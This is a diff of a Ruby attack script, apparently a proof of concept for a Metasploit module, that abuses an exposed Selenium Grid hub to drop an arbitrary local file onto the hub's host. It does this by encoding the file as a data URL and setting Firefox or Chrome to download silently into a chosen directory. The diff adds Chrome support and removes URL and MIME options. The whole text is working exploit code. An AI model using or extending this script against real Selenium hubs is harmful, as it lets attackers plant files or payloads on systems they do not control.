@@ -8,7 +8,6 @@
 # Converted to Ruby for metasploit module
 
 require 'selenium-webdriver'
-require 'mime/types'
 require 'base64'
 require 'optparse'
 
@@ -24,14 +23,8 @@ OptionParser.new do |opts|
   opts.on('-lFILE', '--localFILE', 'The (small) local to upload.') do |l|
     options[:local] = l
   end
-  opts.on('-uURL', '--url-fileURL', 'The URL for a file to upload. Useful for larger files.') do |u|
-    options[:url_file] = u
-  end
-  opts.on('-mTYPE', '--mimeTYPE', 'The optional MIME type for the url-file. Will try to guess if empty.') do |m|
-    options[:mime] = m
-  end
-  opts.on('-dDATA', '--dataDATA', 'Raw string to write to a new file.') do |d|
-    options[:data] = d
+  opts.on('-bBROWSER', '--dataBROWSER', 'firefox or chrome.') do |b|
+    options[:browser] = b
   end
   opts.on('--help', 'Prints this help') do
     puts opts
@@ -42,36 +35,42 @@ end.parse!
 hub_url = options[:hub]
 remote_file = options[:remote]
 local_file = options[:local]
-url_file = options[:url_file]
-mime_type = options[:mime]
-data = options[:data]
-
-# if local file, slurp and encode it in a URL
-if not local_file.to_s.empty? # Inline for small local files
-  url_file = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
-  mime_type = 'application/octet-stream;'
-end
-
-# if remote file and non mime, try to get it
-if (not url_file.to_s.empty?) and mime_type.to_s.empty?
-  mime_type = MIME::Types.type_for(url_file).first.content_type
-end
+browser = options[:browser]
 
 # Inline html with an inline download file link
+url_file = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]
 data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [url_file, File::basename(remote_file)]
 
-# Configure browser profile to use custom download location and not prompt to save files for mime type. This should probably be turned off by default.
-profile = Selenium::WebDriver::Firefox::Profile.new
-profile['browser.download.folderList'] = 2
-profile['browser.download.manager.showWhenStarting'] = false
-profile['browser.download.dir'] = File::dirname(remote_file)
-profile['browser.helperApps.neverAsk.saveToDisk'] = mime_type
-capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
+capabilities = {}
+if browser == 'chrome'
+  capabilities = Selenium::WebDriver::Remote::Capabilities.chrome(
+    "chromeOptions" => {
+      'prefs' => {
+        'profile.default_content_settings.popups' => 0,
+        'download.default_directory' => File::dirname(remote_file),
+        'download.prompt_for_download' => false,
+      }
+    }
+  )
+else
+   # Configure browser profile to use custom download location and not prompt to save files for mime type.
+  profile = Selenium::WebDriver::Firefox::Profile.new
+  profile['browser.download.folderList'] = 2
+  profile['browser.download.manager.showWhenStarting'] = false
+  profile['browser.download.dir'] = File::dirname(remote_file)
+  profile['browser.helperApps.neverAsk.saveToDisk'] = 'application/octet-stream;'
+  capabilities = Selenium::WebDriver::Remote::Capabilities.firefox(:firefox_profile => profile)
+end
+
 driver = Selenium::WebDriver.for :remote, :url => hub_url, :desired_capabilities => capabilities
 
 # Load the data URL and click the download link
 driver.navigate.to(data_url)
 driver.find_element(:id, 'f').click
+
+if browser == 'chrome' # Not sure why this is needed
+  sleep(5)
+end
 driver.quit
 
 exit
